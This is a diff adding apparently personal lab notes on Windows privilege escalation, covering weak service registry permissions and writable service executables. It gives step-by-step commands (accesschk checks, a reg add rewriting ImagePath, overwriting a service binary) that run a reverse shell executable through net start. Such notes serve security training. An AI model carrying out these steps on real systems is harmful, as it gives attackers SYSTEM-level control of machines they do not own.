@@ -77,5 +77,44 @@ Kernal Exploits
        5. Start the service
        net start unquotedsvc
    3. Weak Registry Permissions
+      Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, we can possibly modify a service's config.
+      EXAMPLE!!!
+      1. winPEASany.exe found we can modify a service registry
+      HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])
+      2.verify permissions via powershell or acchesschk (we are part of the Interactive group)
+      powershell -exec bypass
+      Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
+      .\accesschk.exe /accepteula -uvwqk HKLM\system\currentcontrolset\services\regsvc
+        RW NT AUTHORITY\INTERACTIVE
+            KEY_ALL_ACCESS
+      3. Use accesschk.exe to verify we can start the service
+      .\accesschk.exe /accepteula -ucqv user regsvc
+      SERVICE_START
+      SERVICE_STOP
+      4. Check current values in service registry entry
+      reg query HKLM\SYSTEM\CurrentControlSet\Services\regsvc
+      ImagePath REG_EXPAND_SZ "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
+      5. Override ImagePath Value to point to reverse shell via change binpath
+      reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+      6. Start the service
+      net start regsvc
    4. Insecure Service Executables
+      If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable
+      Always create a backup of the original executable in a real system
+      EXAMPLE!!!
+      1. Winpeas found  filepermsvc is writeable by everyone "C:\Program Files\File Permissions Service\filepermservice.exe"
+      2. Check with accesschk to verify we can write over it
+      .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+        RW Everyone
+            FILE_ALL_ACCESS
+      3. check if we can start the service
+      .\accesschk.exe /accepteula -uvqc filepermsvc
+      SERVICE_START
+      SERVICE_STOP
+      4. backup original executable
+      copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
+      5. overwrite executable with reverse shell
+      copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+      6. Start the service
+      net start filepermsvc
    5. DLL Hijacking
